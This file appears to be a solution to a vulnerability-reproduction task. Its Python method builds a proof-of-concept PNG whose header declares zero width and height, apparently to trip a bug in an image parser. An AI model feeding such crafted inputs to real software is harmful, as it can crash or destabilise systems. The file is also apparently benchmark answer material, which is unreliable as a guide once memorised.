import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = b'\x89PNG\r\n\x1a\n'
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00'
        ihdr_length = len(ihdr_data).to_bytes(4, 'big')
        ihdr_type = b'IHDR'
        ihdr_crc_input = ihdr_type + ihdr_data
        ihdr_crc = zlib.crc32(ihdr_crc_input) & 0xffffffff
        ihdr_crc_bytes = ihdr_crc.to_bytes(4, 'big')
        iend_length = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_crc_input = iend_type
        iend_crc = zlib.crc32(iend_crc_input) & 0xffffffff
        iend_crc_bytes = iend_crc.to_bytes(4, 'big')
        poc = (signature + ihdr_length + ihdr_type + ihdr_data + ihdr_crc_bytes +
               iend_length + iend_type + iend_crc_bytes)
        return poc
